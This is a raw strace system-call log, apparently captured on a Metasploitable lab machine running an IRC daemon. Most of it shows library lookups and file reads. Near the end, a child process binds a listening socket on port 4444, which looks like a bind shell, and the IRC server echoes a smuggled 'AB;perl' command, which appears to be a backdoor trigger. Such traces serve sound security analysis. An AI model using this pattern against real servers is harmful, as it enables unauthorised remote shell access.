6990  07:16:29.148736 stat64("/lib/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148747 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148759 stat64("/lib/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148769 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148784 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.148801 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148814 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148826 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148839 stat64("/usr/lib/tls/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148850 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148863 stat64("/usr/lib/tls/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148874 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148886 stat64("/usr/lib/tls/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148898 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148910 stat64("/usr/lib/tls/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148921 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148934 stat64("/usr/lib/tls/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148945 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148957 stat64("/usr/lib/tls/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148968 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148980 stat64("/usr/lib/tls", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148991 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149003 stat64("/usr/lib/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149015 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149034 stat64("/usr/lib/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149046 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149058 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.149076 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149088 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.149105 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149118 stat64("/usr/lib/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149129 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149141 stat64("/usr/lib/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149152 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149164 stat64("/usr/lib/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149175 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149187 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
6990  07:16:29.149203 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149217 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149230 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149243 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149259 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149273 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149286 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149299 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149311 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149324 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149336 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149349 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149361 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149374 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149386 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149398 stat64("/lib/i486-linux-gnu/tls", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149410 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149423 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149436 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149449 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149461 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149474 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149486 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149498 stat64("/lib/i486-linux-gnu/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149510 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149552 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149579 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149591 stat64("/lib/i486-linux-gnu/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149603 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149616 stat64("/lib/i486-linux-gnu/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149627 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149640 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.149657 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149671 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149684 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149698 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149710 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149724 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149736 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149752 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149765 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149778 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149791 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149804 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149816 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149829 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149842 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149854 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149866 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149880 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149892 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149906 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149918 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149931 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149944 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149956 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149968 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.149981 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.149994 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.150007 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.150025 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.150039 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.150051 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.150063 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.150082 munmap(0xb7d61000, 29913) = 0
6990  07:16:29.150103 open("/etc/ld.so.cache", O_RDONLY) = 6
6990  07:16:29.150116 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6990  07:16:29.150132 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d61000
6990  07:16:29.150143 close(6)          = 0
6990  07:16:29.150153 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6990  07:16:29.150168 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
6990  07:16:29.150183 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6990  07:16:29.150280 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6990  07:16:29.150302 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d56000
6990  07:16:29.150314 mmap2(0xb7d5f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d5f000
6990  07:16:29.150332 close(6)          = 0
6990  07:16:29.150355 munmap(0xb7d61000, 29913) = 0
6990  07:16:29.150371 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6990  07:16:29.150387 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6990  07:16:29.150403 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6990  07:16:29.150420 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d68000
6990  07:16:29.150431 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6990  07:16:29.150629 close(6)          = 0
6990  07:16:29.150641 munmap(0xb7d68000, 4096) = 0
6990  07:16:29.150659 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6990  07:16:29.150673 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6990  07:16:29.150690 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d68000
6990  07:16:29.150701 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6990  07:16:29.150878 close(6)          = 0
6990  07:16:29.150887 munmap(0xb7d68000, 4096) = 0
6990  07:16:29.150914 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
6990  07:16:29.150936 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af358) = -1 EINVAL (Invalid argument)
6990  07:16:29.150951 _llseek(6, 0, 0xbf9af3a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.150962 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af358) = -1 EINVAL (Invalid argument)
6990  07:16:29.150973 _llseek(6, 0, 0xbf9af3a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.150983 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
6990  07:16:29.151055 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
6990  07:16:29.151094 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
6990  07:16:29.151124 listen(6, 5)      = 0
6990  07:16:29.151176 accept(6,  <unfinished ...>
6989  07:16:29.157052 exit_group(0)     = ?
6987  07:16:29.157052 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6989
6987  07:16:29.157052 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.157053 --- SIGCHLD (Child exited) @ 0 (0) ---
6987  07:16:29.157053 waitpid(-1, 0xbfe5a9c8, WNOHANG) = -1 ECHILD (No child processes)
6987  07:16:29.157053 sigreturn()       = ? (mask now [])
6987  07:16:29.157064 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6987  07:16:29.157108 exit_group(0)     = ?
4519  07:16:29.157156 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6987
4519  07:16:29.157169 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:16:29.157184 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:16:29.157195 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:16:29.157205 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:16:29.157224 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:16:29.157290 gettimeofday({1495624589, 157296}, NULL) = 0
4519  07:16:29.157305 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 760000})
4519  07:16:29.397056 clock_gettime(CLOCK_MONOTONIC, {1399, 214065137}) = 0
4519  07:16:29.397056 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:16:29.397056 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397057 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397057 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397057 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397057 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397058 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397058 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397070 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397083 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397097 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397110 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397124 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397138 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397151 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397165 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397190 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397205 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397218 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397232 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397247 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397262 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397275 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.397293 time(NULL)        = 1495624589
4519  07:16:29.397303 time(NULL)        = 1495624589
4519  07:16:29.397316 gettimeofday({1495624589, 397320}, NULL) = 0
4519  07:16:29.397329 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
